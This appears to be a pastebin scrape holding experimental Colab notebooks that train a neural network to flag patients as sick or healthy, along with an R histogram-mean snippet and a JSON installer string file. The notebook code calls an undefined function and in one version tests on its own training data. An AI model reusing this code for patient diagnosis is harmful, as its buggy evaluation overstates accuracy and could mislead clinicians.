            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Now, normalize the last column separately to achieve grayscale


        min_pixel_value = np.min(data[:, -1])
        max_pixel_value = np.max(data[:, -1])
        pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]

    return image

def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Normalize the last column separately to achieve grayscale
        min_pixel_value = np.min(data[i])
        max_pixel_value = np.max(data[i])
        pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
        image[i, -1] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]

    return image


def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    # Normalize the first two columns independently
    for j in range(2):
        min_pixel_value = np.min(data[:, j])
        max_pixel_value = np.max(data[:, j])
        for i in range(num_rows):
            pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

    # Normalize the last column separately to achieve grayscale
    min_pixel_value = np.min(data[:, -1])
    max_pixel_value = np.max(data[:, -1])
    for i in range(num_rows):
        pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
        image[i, -1] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]

    return image

def create_imageN(data, predictions, label_colors=None):
    # Convert data to a NumPy array
    data = np.array(data)

    num_rows, num_columns = data.shape
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    # Normalize the first two columns independently
    for j in range(2):
        min_pixel_value = np.min(data[:, j])
        max_pixel_value = np.max(data[:, j])
        for i in range(num_rows):
            pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

    # Normalize the last column separately to achieve grayscale
    min_pixel_value = np.min(data[:, -1])
    max_pixel_value = np.max(data[:, -1])
    for i in range(num_rows):
        pixel_value = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
        image[i, -1] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]

    return image


def create_imageN(data, predictions, label_colors=None):
    # Convert data to a NumPy array
    data = np.array(data)

    num_rows, num_columns = data.shape
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    # Normalize the first two columns independently
    for j in range(2):
        min_pixel_value = np.min(data[:, j])
        max_pixel_value = np.max(data[:, j])
        for i in range(num_rows):
            pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

    # Normalize the last column separately to achieve grayscale
    min_pixel_value_last = np.min(data[:, -1])
    max_pixel_value_last = np.max(data[:, -1])
    for i in range(num_rows):
        pixel_value_last = int(np.interp(data[i][-1], [min_pixel_value_last, max_pixel_value_last], [0, 255]))
        image[i, -1] = np.array([pixel_value_last] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]

    return image

def create_imageN(data, predictions, label_colors=None):
    image_training = np.zeros((num_training_rows, len(X_train[0]) + 1, 3), dtype=np.uint8)


    print(""**************************"",num_training_rows,""*******************"")

    min_pixel_value = np.min(X_train_normalized)
    max_pixel_value = np.max(X_train_normalized)

    # Populate image_training with consistent gray and red/green colors based on the labels in the last column
    # for i, label in enumerate(y_train):
    #     for j in range(len(X_train[0])
    #         pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
    #         image_training[i, j] = np.array([pixel_value] * 3)
    #         image_training[i, -1] = np.array([128, 128, 128])
    #     if label == 0:
    #         image_training[i, -1] = np.array([0, 128, 0])
    #     elif label == 1:
    #         image_training[i, -1] = np.array([255, 0, 0])



    # Populate image_training with consistent gray and red/green colors based on the labels in the last column
    for i, label in enumerate(y_train):
        for j in range(len(X_train[0])):
            pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
            image_training[i, j] = np.array([pixel_value] * 3)
        image_training[i, -1] = np.array([128, 128, 128])
        if label == 0:
            image_training[i, -1] = np.array([0, 128, 0])
        elif label == 1:
            image_training[i, -1] = np.array([255, 0, 0])


    return image_training








def create_imageN(data, predictions, label_colors=None):
    num_training_rows = 1  # Set the number of rows to 1
    image_training = np.zeros((num_training_rows, len(X_train[0]) + 1, 3), dtype=np.uint8)

    min_pixel_value = np.min(X_train_normalized)
    max_pixel_value = np.max(X_train_normalized)

    # Populate image_training with consistent gray and red/green colors based on the labels in the last column
    for j in range(len(X_train[0])):
        pixel_value = int(np.interp(data[0][j], [min_pixel_value, max_pixel_value], [0, 255]))
        image_training[0, j] = np.array([pixel_value] * 3)

    image_training[0, -1] = np.array([128, 128, 128])  # Set a consistent gray background

    label = y_train[0]
    if label == 0:
        image_training[0, -1] = np.array([0, 128, 0])  # Green for label 0
    elif label == 1:
        image_training[0, -1] = np.array([255, 0, 0])  # Red for label 1

    return image_training

def create_imageN(data, predictions, label_colors=None):
    num_training_rows = len(data)  # Set the number of rows based on the data
    num_columns = len(data[0])

    image_training = np.zeros((num_training_rows, num_columns + 1, 3), dtype=np.uint8)

    min_pixel_value = np.min(X_train_normalized)
    max_pixel_value = np.max(X_train_normalized)

    for i in range(num_training_rows):
        # Normalize the first columns independently
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
            image_training[i, j] = np.array([pixel_value] * 3)

        # Normalize the last column separately to achieve grayscale
        pixel_value_last = int(np.interp(data[i][-1], [min_pixel_value, max_pixel_value], [0, 255]))
        image_training[i, -1] = np.array([pixel_value_last] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image_training[i, -1] = label_colors[predictions[i]]

    return image_training




# Load data from a file
#file_path = 'C:/Users/Hynek/Desktop/example4.txt'
from google.colab import files
uploaded = files.upload()

# Tento kód otevře dialogové okno pro výběr souboru z vašeho počítače.
import io
import pandas as pd

# Předpokládáme, že jste nahráli CSV soubor
for fn in uploaded.keys():
  print('User uploaded file ""{name}"" with length {length} bytes'.format(
      name=fn, length=len(uploaded[fn])))
  path = io.BytesIO(uploaded[fn])  # Pro soubory, které potřebují být čteny jako binární objekty
  df = pd.read_csv(path)
  print(df.head())  # Vypíše prvních pět řádků DataFrame


all_results = []
#with open(file_path, 'r') as file:
#    file_content = file.read()

# Execute the content as Python code
##exec(file_content)

import os
import shutil
import ast

for filename in uploaded.keys():
    original_path = f""/content/{filename}""
    destination_path = os.path.join(""/content/"", ""/content/DATA2"")
    shutil.move(original_path, destination_path)
    print(f""Soubor {filename} byl přesunut do {destination_path}"")

file_path = '/content/DATA2'  # Cesta k souboru
with open(file_path, 'r') as file:
    code = file.read()

A_list = ast.literal_eval(code)


# Převod na NumPy pole
A = np.array(A_list)

#exec(code)

# Now, all_results contains lists corresponding to each row in the CSV file
##print(all_results)

# Assign values to variables dynamically based on the rows of matrix A
for i, row in enumerate(A, start=1):
    globals()[f""person{i}_results""] = list(row)

# Print the assigned variables
for i in range(1, len(A) + 1):
  #  print(f""person{i}_results {globals()[f'person{i}_results']}"")
    all_results.append(f""person{i}_results"")
##print(all_results)



result_variables = []

# Loop through the variable names and get the corresponding variables using globals()
for var_name in all_results:
    result_variables.append(globals()[var_name])

# Now, result_variables contains the variables with names specified in variable_names
#print(result_variables)

all_results = result_variables
new_persons_results = result_variables


# # Define the blood test results for sixteen persons
# person1_results = [80, 90, 100, 125, 120, 0]
# person2_results = [95, 105, 115, 110, 135, 1]
# person3_results = [110, 120, 130, 140, 150, 0]
# person4_results = [100, 110, 120, 130, 140, 1]
# person5_results = [105, 115, 100, 105, 110, 0]
# person6_results = [90, 110, 115, 95, 120, 1]
# person7_results = [116, 99, 106, 105, 119, 0]
# person8_results = [111, 93, 118, 118, 107, 1]
# person9_results = [107, 97, 105, 119, 98, 0]
# person10_results = [92, 108, 90, 117, 111, 1]
# person11_results = [118, 105, 103, 118, 99, 0]
# person12_results = [97, 115, 101, 101, 113, 1]
# person13_results = [95, 111, 93, 112, 120, 0]
# person14_results = [100, 112, 118, 109, 103, 1]
# person15_results = [113, 91, 94, 93, 99, 0]
# person16_results = [103, 92, 95, 110, 98, 1]

# # Combine the results into a list
# all_results = [person1_results, person2_results, person3_results, person4_results,
#                person5_results, person6_results, person7_results, person8_results,
#                person9_results, person10_results, person11_results, person12_results,
#                person13_results, person14_results, person15_results, person16_results]


# #all_results = [person1_results, person2_results]


# Extract the last column (0 or 1) as labels
labels = [results[-1] for results in all_results]

# Remove the last column from the dataset
data = [results[:-1] for results in all_results]

# Define the number of rows for training and testing
num_training_rows = 100
num_testing_rows = 100

# Split the data into training and testing datasets
#X_train, X_test, y_train, y_test = data[:num_training_rows], data[-num_testing_rows:], labels[:num_training_rows], labels[-num_testing_rows:]

X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_testing_rows], labels[:num_training_rows], labels[:num_testing_rows]


# Normalize the training data
min_values = np.min(X_train, axis=0)
max_values = np.max(X_train, axis=0)
X_train_normalized = (X_train - min_values) / (max_values - min_values)


# Normalize the training data
min_values = np.min(X_train, axis=0)
max_values = np.max(X_train, axis=0)
X_train_normalized = (X_train - min_values) / (max_values - min_values)

# Normalize the testing data using the min and max values of the training data
X_test_normalized = (X_test - min_values) / (max_values - min_values)


# Print normalized training data
print(""Normalized Training Data:"")
print(X_train_normalized)
print(""Adenormalized"",X_train_normalized*(max_values - min_values)+min_values,""Bdenormalized"")

# Define a simple neural network model
model = tf.keras.Sequential([
    tf.keras.layers.Dense(128, activation='relu', input_shape=(len(X_train[0]),)),
    tf.keras.layers.Dense(64, activation='relu'),
    tf.keras.layers.Dense(1, activation='sigmoid')
])

# Compile the model
model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])

# Lists to store accuracy values
accuracy_history = []

# Create images for the training data
image_training = np.zeros((num_training_rows, len(X_train[0]) + 1, 3), dtype=np.uint8)


min_pixel_value = np.min(X_train_normalized)
max_pixel_value = np.max(X_train_normalized)

# Populate image_training with consistent gray and red/green colors based on the labels in the last column
# for i, label in enumerate(y_train):
#     for j in range(len(X_train[0])
#         pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
#         image_training[i, j] = np.array([pixel_value] * 3)
#         image_training[i, -1] = np.array([128, 128, 128])
#     if label == 0:
#         image_training[i, -1] = np.array([0, 128, 0])
#     elif label == 1:
#         image_training[i, -1] = np.array([255, 0, 0])



# Populate image_training with consistent gray and red/green colors based on the labels in the last column
for i, label in enumerate(y_train):
    for j in range(len(X_train[0])):
        pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
        image_training[i, j] = np.array([pixel_value] * 3)
    image_training[i, -1] = np.array([128, 128, 128])
    if label == 0:
        image_training[i, -1] = np.array([0, 128, 0])
    elif label == 1:
        image_training[i, -1] = np.array([255, 0, 0])






from tqdm.notebook import tqdm_notebook


###ZDE VLOZTE DATA OD NOVYCH PACIENTU


# Train the model for 400 epochs
epochs = 1397
# Assuming 'new_persons_results' is a list of new persons, where each person is represented as a list of features
new_persons_results = [
   # [101, 112],
   # [0.54422416, 0.02778176],
   # [22.57372914, 17.96922325],
#    [22.57372914, 17.96922325]
    # Add more new persons as needed
#          [23.65780072, 18.8599168 ],
#          [22.57372914, 17.96922325],
#          [32.55342397, 29.46365141],
#          [ 6.71803504, 25.70466547],
#          [ 6.71803504, 25.70466547],
#          [14.40191857, 16.77085649],
#          [17.45790731, 21.76521471],
#          [2110.02796947, 73.45445955],
#          [30.29513837, 62.90111289],
#          [15.1289778,  32.40267702],

 [23.65780072, 18.8599168 ],
 [22.57372914, 17.96922325],
 [32.55342397, 29.46365141],
 [ 6.71803504, 25.70466547],
 [14.40191857, 16.77085649],
 [17.45790731, 21.76521471],
 [20.02796947, 73.45445955],

]

import sys

for epoch in tqdm_notebook(range(epochs)):
    history = model.fit(X_train_normalized, np.array(y_train), epochs=1, verbose=0, shuffle=False)
    accuracy_history.append(history.history['accuracy'][0])

    if epoch == 1:
        # Normalize the testing data
        X_test_normalized = (X_test - min_values) / (max_values - min_values)
        y_pred_after_2nd_epoch = model.predict(X_test_normalized)
        y_pred_binary_after_2nd_epoch = [1 if pred >= 0.5 else 0 for pred in y_pred_after_2nd_epoch]
        image_testing_before_2nd_epoch = create_image(X_test_normalized, y_pred_binary_after_2nd_epoch, label_colors_testing)

    if epoch >= epochs-1:
        print(f""HERE HERE Epoch: {epoch}, Epochs: {epochs}\n"")
        sys.stdout.flush()

        # Iterate through new persons
        for idx, personNEW_results in enumerate(new_persons_results, start=1):
            # Ensure that personNEW_results has the same number of features as the model expects
            assert len(personNEW_results) == len(X_train[0]), ""Mismatch in the number of features.""

            personNEW_results_normalized = (np.array(personNEW_results) - min_values) / (max_values - min_values)

            personNEW_prediction = model.predict(np.array([personNEW_results_normalized]))
            personNEW_label = 1 if personNEW_prediction >= 0.5 else 0
            y_pred_after_50_epochs = model.predict(X_test_normalized)
            y_pred_binary_after_50_epochs = [1 if pred >= 0.5 else 0 for pred in y_pred_after_50_epochs]
            image_testing_after_50_epochs = create_image(X_test_normalized, y_pred_binary_after_50_epochs, label_colors_testing)

            # Create an image for the new person
            image_personNEW = create_imageN([personNEW_results_normalized], [personNEW_label], label_colors)

            # Display the images
            plt.figure(figsize=(5, 5))
            plt.imshow(image_personNEW)
            plt.title(f""New Person {idx}\nLabel: {personNEW_label}, Prediction: {personNEW_prediction}"")
            plt.axis(""off"")
            plt.show()


# Display the images
plt.figure(figsize=(25, 15))
plt.subplot(2, 2, 1)
plt.imshow(image_training)
plt.title(""Training Data"")
plt.axis(""off"")

plt.subplot(2, 2, 2)
plt.imshow(image_testing_before_2nd_epoch)
plt.title(""Testing Data (2nd Epoch)"")
plt.axis(""off"")

plt.subplot(2, 2, 3)
plt.imshow(image_testing_after_50_epochs)
plt.title(f""Testing Data ({epochs} Epochs)"")
plt.axis(""off"")

plt.subplot(2, 2, 4)
plt.imshow(image_personNEW)
plt.title(f""New Person\nLabel: {personNEW_label},[{personNEW_prediction}]"")
plt.axis(""off"")

# Plot accuracy history
plt.figure(figsize=(12, 5))
plt.plot(range(1, epochs + 1), accuracy_history, marker='o')
plt.title('Accuracy Over Epochs')
plt.xlabel('Epochs')
plt.ylabel('Accuracy')
plt.grid()

# Print normalized data
print(""Normalized PersonNEW Data:"")
print(personNEW_results_normalized)

plt.show()

print(""X_train before normalization:"")
print(X_train)
print(""X_test before normalization:"")
print(X_test)

import seaborn as sns


print(""KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK"")
print(X_test)
print(""HHHHHHHHHHHHHHHHHHHHHHHHHHHHHH"")
print(X_train)
print(""LLLLLLLLLLLLLLLLLLLLLLLLLLLLL"")


# y_pred_binary = [1 if pred >= 0.5 else 0 for pred in model.predict(X_test_normalized)]

# # Create confusion matrix
# conf_matrix = confusion_matrix(y_train, y_pred_binary)
# print(conf_matrix)


from sklearn.metrics import confusion_matrix
from tensorflow.keras.utils import to_categorical

# # Normalize the training data
# min_values = np.min(np.concatenate([X_train, X_test], axis=0), axis=0)
# max_values = np.max(np.concatenate([X_train, X_test], axis=0), axis=0)
# X_train_normalized = (X_train - min_values) / (max_values - min_values)
# X_test_normalized = (X_test - min_values) / (max_values - min_values)

np.set_printoptions(threshold=np.inf, precision=4, suppress=True)


# # Assuming X_test_normalized and y_test are your test set data
# y_pred_binary = [1 if pred >= 0.5 else 0 for pred in model.predict(X_test_normalized)]

# # Create confusion matrix using the test set
# conf_matrix = confusion_matrix(y_test, y_pred_binary)
# print(conf_matrix)



# plt.figure(figsize=(6, 6))
# sns.heatmap(conf_matrix, annot=True, fmt=""d"", cmap=""Blues"", xticklabels=['Predicted 0', 'Predicted 1'], yticklabels=['Actual 0', 'Actual 1'])
# plt.xlabel(""Predicted Label"")
# plt.ylabel(""True Label"")
# plt.title(""Confusion Matrix"")
# plt.show()

# X_train = np.array(X_train)
# y_train_one_hot = np.array(y_train_one_hot)

# RozdÄ›lenĂ­ dat na trĂ©novacĂ­ a testovacĂ­ mnoĹľiny
###X_train, X_test, y_train, y_test = data[:num_training_rows], data[-num_testing_rows:], labels[:num_training_rows], labels[-num_testing_rows:]

###X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_training_rows], labels[:num_training_rows], labels[:num_training_rows]
X_train, X_test, y_train, y_test = data[:num_training_rows], data[:num_testing_rows], labels[:num_training_rows], labels[:num_testing_rows]

import numpy as np
import matplotlib.pyplot as plt
from sklearn.metrics import confusion_matrix, accuracy_score, precision_score, recall_score, f1_score
import tensorflow as tf
import seaborn as sns

# Assuming data splitting and model definition have been done correctly

# Compile the model
model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])

# Train the model
print(""Training Start"")
for epoch in tqdm_notebook(range(1000), desc=""Training Progress""):
    model.fit(np.array(X_train_normalized), np.array(y_train), epochs=1, verbose=0)
print(""Training Complete"")

# Generate predictions from the model
predictions = (model.predict(X_test_normalized) > 0.5).astype(int)

# Convert y_test to a numpy array and then to binary labels
y_test_array = np.array(y_test)  # Convert y_test to a numpy array
y_test_binary = (y_test_array > 0.5).astype(int)  # Convert to binary

# Compute the confusion matrix
conf_matrix = confusion_matrix(y_test_binary, predictions)

# Evaluate the model's performance
accuracy = accuracy_score(y_test_binary, predictions)
precision = precision_score(y_test_binary, predictions)
recall = recall_score(y_test_binary, predictions)
f1 = f1_score(y_test_binary, predictions)

# Display the confusion matrix
sns.heatmap(conf_matrix, annot=True, fmt='d', cmap='Blues')
plt.xlabel('Predicted')
plt.ylabel('Actual')
plt.title('Confusion Matrix')
plt.show()

print(f""Accuracy: {accuracy:.4f}"")
print(f""Precision: {precision:.4f}"")
print(f""Recall: {recall:.4f}"")
print(f""F1 Score: {f1:.4f}"")

print(f""Confusion Matrix2122:\n{conf_matrix}"")"
dcqjdyrW,calculate mean from histogram,vanloon,R,Saturday 25th of May 2024 02:05:09 PM CDT,"# Code to illustrate how to calculate mean of a histogram (possibly 
# with uneven class-widths).

# Example data: 
# As input we use a frequency distribution of age groups, stored in two variables:
#   nr = the counts per age group
#   agegrp = the labels for each age group

nr <- c(8, 11, 26, 20, 13, 5)
agegrp <- c('<1','1-2','3-5','6-11','12-17','18+')

# Based on the variable agegrp, the mean age of each age-group is 
# determined. The result is stored in the variable midgrp.
# The mean age is just the middle value of the range - here done by
# 'hand-work' (no programming). 
# For the highest interval, the assumption was made that it ranges up to 20.
midgrp <- c(0.5, 1.5, 4, 8.5, 14.5, 19) 

# Now the estimated mean age for this frequency distribution
# is calculated by multiplying the mean per interval with the reltive frequency
# per interval and summing these values.
relfreq <- nr/sum(nr)
( mean <- sum(midgrp * relfreq) )

"
juDuZHYZ,English,RRdabbyholla3,JSON,Saturday 25th of May 2024 01:59:05 PM CDT,"// InstallingProcess

{
    ""InstallingFilesText"": ""Installing setup files"",
    ""InstallingLanguageText"": ""Installing language"",
    ""PepareRestartText"": ""Prepairing to restart"",
    ""RestartText"": ""Restarting""
}"
CM2KJZ1c,create_imageN jen jednou GOOD VK,max2201111,Python,Saturday 25th of May 2024 01:58:25 PM CDT,"#Navod na pouziti, Mgr. Hynek Mlčoušek, v Brne 2.5.2024
#Ulozte do lokalniho souboru u sebe na PC data tohoto tvaru vzdy ukoncene 0 ci 1 (jde o uceni s ucitelem: 1 = nemocny, 0 = prezil/zdravy, ve vystupu bude zelena znacit 0, cervena 1)  a bez znaku #; pozor na "",""

# [ [23.657800719276743,18.859916797201468,0],
# [22.573729142097473,17.96922325097786,0],
# [32.55342396968757,29.463651408558803,0],
# [6.718035041529263,25.704665468161718,1],
# [14.401918566243225,16.770856492924658,0],
# [17.457907312962234,21.76521470574044,0],
# [20.02796946568093,73.45445954770891,1],
# [30.295138369778076,62.901112886193246,1],
# [15.128977804449633,32.40267702110393,0],
# [30.179457395820013,58.982492125646104,1],
# [28.01649701854089,63.92781357637711,1],
# [16.791838457871147,42.33482314089884,0],
# [10.583694293380976,19.61926728942497,0],
# [26.634447074406467,91.96624817360987,1],
# [26.217868623367643,36.400293587062976,0],
# [17.689396788624936,60.79797114006423,1],
# [33.17193822527976,66.75277364959176,1],
# [23.793952755709153,22.57501437360518,0]]

#kliknete na cerne tlacitko s trojuhelnickem vlevo nahore
#pod kodem se objevi moznost spustit dialogove okenko, kliknete na nej
#soubor, ktery mate z bodu vyse vyberte a nahrajte
#Najdete v tomto kodu retezec:
###ZDE VLOZTE DATA OD NOVYCH PACIENTU

#Vlozte do pole
# new_persons_results = []
# data o nekolika malo novych pacientech bez ukoncovaci 0 a 1, ale se stejnym poctem sloupcu jako ma soubor z Vaseho lokalniho disku, vyse by tedy toto bylo rovno 2
#kod vyhodi hned po natrenovani, (jehoz prubeh muzete sledovat na modre progres bare) pro kazdy radek z new_persons_results bilo-sedo-cerne ctverecky vznikle z normalizace poskytnutych dat a ukoncovaci ctverecek cerveny pripadne zeleny
#zaroven s tim se vypise realne cislo mezi 0 a 1 znacici jak moc je pacient zdravy (blizke 0) ci nemocny (blizke 1)
#cisla uprostred pak indikuji zadany oranzovy semafor.
#je na lekarich nastavit tresholdy (tedy pravdepodobnosti: cisla mezi 0 a 1) ktere pak daji zaver, zda je pacient cerveny, oranzovy ci zeleny

# prosim o komnetare a vysledky na realnych datech, je zadouci aby radku v matici, tedy pacientu byly stovky a sloupcu desitky
# Moznosti vyuziti: onkologicka diagnoza vs. zdrava kontorlni skupina, diabetes (pritomnost/nepritomnost), testovani noveho leku oproti placebu atd.

#kod zaroven vyhodi confusion matici, tedy mozne True Negative a False Positive plus spravne zarazene hodnoty spolu s presnosti,F1 score recall atd.
#poznamka ke kodu: jde o epxerimentalni verzi, ktera krome skutecne potrebneho kodu obsahuje ladici informace, ruzne duplicity, nadbytecne prikazy atd.
# Na uvod behu programu se pro kontorlu vypise poskytnuta matice a jeji normalizovana verze, je treba sjet jezdcem napravo nize na obrazky a dalsi vystupy

#Dekuji profesoru Petru Dostalovi za namet k teto praci a poskytnuta data, byt je potreba mit data realna

import numpy as np
import matplotlib.pyplot as plt
import tensorflow as tf
from tqdm import tqdm


from IPython.display import display
from IPython.display import Javascript
display(Javascript('IPython.OutputArea.auto_scroll_threshold = 9999;'))

label_colors = {0: [0, 128, 0], 1: [255, 0, 0]}
label_colors_testing = {0: [0, 128, 0], 1: [255, 0, 0]}

%matplotlib inline

def create_imageN(data, predictions, label_colors=None):
    # Convert data to a NumPy array
    data = np.array(data)

    num_rows, num_columns = data.shape
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    # Normalize the first two columns independently
    for j in range(2):
        min_pixel_value = np.min(data[:, j])
        max_pixel_value = np.max(data[:, j])
        for i in range(num_rows):
            pixel_value = int(np.interp(data[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

    # Normalize the last column separately to achieve grayscale
    min_pixel_value_last = np.min(data[:, -1])
    max_pixel_value_last = np.max(data[:, -1])
    for i in range(num_rows):
        pixel_value_last = int(np.interp(data[i][-1], [min_pixel_value_last, max_pixel_value_last], [0, 255]))
        image[i, -1] = np.array([pixel_value_last] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]

    return image

# Load data from a file
#file_path = 'C:/Users/Hynek/Desktop/example4.txt'
from google.colab import files
uploaded = files.upload()

# Tento kód otevře dialogové okno pro výběr souboru z vašeho počítače.
import io
import pandas as pd

# Předpokládáme, že jste nahráli CSV soubor
for fn in uploaded.keys():
    print('User uploaded file ""{name}"" with length {length} bytes'.format(
        name=fn, length=len(uploaded[fn])))
    path = io.BytesIO(uploaded[fn])  # Pro soubory, které potřebují být čteny jako binární objekty
    df = pd.read_csv(path)
    print(df.head())  # Vypíše prvních pět řádků DataFrame

all_results = []
import os
import shutil
import ast

for filename in uploaded.keys():
    original_path = f""/content/{filename}""
    destination_path = os.path.join(""/content/"", ""/content/DATA2"")
    shutil.move(original_path, destination_path)
    print(f""Soubor {filename} byl přesunut do {destination_path}"")

file_path = '/content/DATA2'  # Cesta k souboru
with open(file_path, 'r') as file:
    code = file.read()

A_list = ast.literal_eval(code)

# Převod na NumPy pole
A = np.array(A_list)

# Assign values to variables dynamically based on the rows of matrix A
for i, row in enumerate(A, start=1):
    globals()[f""person{i}_results""] = list(row)

# Print the assigned variables
for i in range(1, len(A) + 1):
    all_results.append(f""person{i}_results"")

result_variables = []

# Loop through the variable names and get the corresponding variables using globals()
for var_name in all_results:
    result_variables.append(globals()[var_name])

# Now, result_variables contains the variables with names specified in variable_names
all_results = result_variables
new_persons_results = result_variables

# Extract the last column (0 or 1) as labels
labels = [results[-1] for results in all_results]

# Remove the last column from the dataset
data = [results[:-1] for results in all_results]

# Rozdělení dat na trénovací a testovací sady s náhodným mícháním
from sklearn.model_selection import train_test_split
X_train, X_test, y_train, y_test = train_test_split(data, labels, test_size=0.2, random_state=42, shuffle=True)

# Normalize the training data
min_values = np.min(X_train, axis=0)
max_values = np.max(X_train, axis=0)
X_train_normalized = (X_train - min_values) / (max_values - min_values)

# Normalize the testing data using the min and max values of the training data
X_test_normalized = (X_test - min_values) / (max_values - min_values)

# Print normalized training data
print(""Normalized Training Data:"")
print(X_train_normalized)
print(""Adenormalized"",X_train_normalized*(max_values - min_values)+min_values,""Bdenormalized"")

# Define a simple neural network model
model = tf.keras.Sequential([
    tf.keras.layers.Dense(128, activation='relu', input_shape=(len(X_train[0]),)),
    tf.keras.layers.Dense(64, activation='relu'),
    tf.keras.layers.Dense(1, activation='sigmoid')
])

# Compile the model
model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])

# Lists to store accuracy values
accuracy_history = []

# Create images for the training data
image_training = np.zeros((len(X_train), len(X_train[0]) + 1, 3), dtype=np.uint8)

min_pixel_value = np.min(X_train_normalized)
max_pixel_value = np.max(X_train_normalized)

# Populate image_training with consistent gray and red/green colors based on the labels in the last column
for i, label in enumerate(y_train):
    for j in range(len(X_train[0])):
        pixel_value = int(np.interp(X_train_normalized[i][j], [min_pixel_value, max_pixel_value], [0, 255]))
        image_training[i, j] = np.array([pixel_value] * 3)
    image_training[i, -1] = np.array([128, 128, 128])
    if label == 0:
        image_training[i, -1] = np.array([0, 128, 0])
    elif label == 1:
        image_training[i, -1] = np.array([255, 0, 0])

from tqdm.notebook import tqdm_notebook

###ZDE VLOZTE DATA OD NOVYCH PACIENTU

# Train the model for 400 epochs
epochs = 1397
# Assuming 'new_persons_results' is a list of new persons, where each person is represented as a list of features
new_persons_results = [
    [23.65780072, 18.8599168 ],
    [22.57372914, 17.96922325],
    [32.55342397, 29.46365141],
    [ 6.71803504, 25.70466547],
    [14.40191857, 16.77085649],
    [17.45790731, 21.76521471],
    [20.02796947, 73.45445955],
]

import sys

for epoch in tqdm_notebook(range(epochs)):
    history = model.fit(X_train_normalized, np.array(y_train), epochs=1, verbose=0, shuffle=True)
    accuracy_history.append(history.history['accuracy'][0])

    if epoch == 1:
        # Normalize the testing data
        X_test_normalized = (X_test - min_values) / (max_values - min_values)
        y_pred_after_2nd_epoch = model.predict(X_test_normalized)
        y_pred_binary_after_2nd_epoch = [1 if pred >= 0.5 else 0 for pred in y_pred_after_2nd_epoch]
        image_testing_before_2nd_epoch = create_image(X_test_normalized, y_pred_binary_after_2nd_epoch, label_colors_testing)

    if epoch >= epochs-1:
        print(f""HERE HERE Epoch: {epoch}, Epochs: {epochs}\n"")
        sys.stdout.flush()

        # Iterate through new persons
        for idx, personNEW_results in enumerate(new_persons_results, start=1):
            # Ensure that personNEW_results has the same number of features as the model expects
            assert len(personNEW_results) == len(X_train[0]), ""Mismatch in the number of features.""

            personNEW_results_normalized = (np.array(personNEW_results) - min_values) / (max_values - min_values)

            personNEW_prediction = model.predict(np.array([personNEW_results_normalized]))
            personNEW_label = 1 if personNEW_prediction >= 0.5 else 0
            y_pred_after_50_epochs = model.predict(X_test_normalized)
            y_pred_binary_after_50_epochs = [1 if pred >= 0.5 else 0 for pred in y_pred_after_50_epochs]
            image_testing_after_50_epochs = create_image(X_test_normalized, y_pred_binary_after_50_epochs, label_colors_testing)

            # Create an image for the new person
            image_personNEW = create_imageN([personNEW_results_normalized], [personNEW_label], label_colors)

            # Display the images
            plt.figure(figsize=(5, 5))
            plt.imshow(image_personNEW)
            plt.title(f""New Person {idx}\nLabel: {personNEW_label}, Prediction: {personNEW_prediction}"")
            plt.axis(""off"")
            plt.show()

# Display the images
plt.figure(figsize=(25, 15))
plt.subplot(2, 2, 1)
plt.imshow(image_training)
plt.title(""Training Data"")
plt.axis(""off"")

plt.subplot(2, 2, 2)
plt.imshow(image_testing_before_2nd_epoch)
plt.title(""Testing Data (2nd Epoch)"")
plt.axis(""off"")

plt.subplot(2, 2, 3)
plt.imshow(image_testing_after_50_epochs)
plt.title(f""Testing Data ({epochs} Epochs)"")
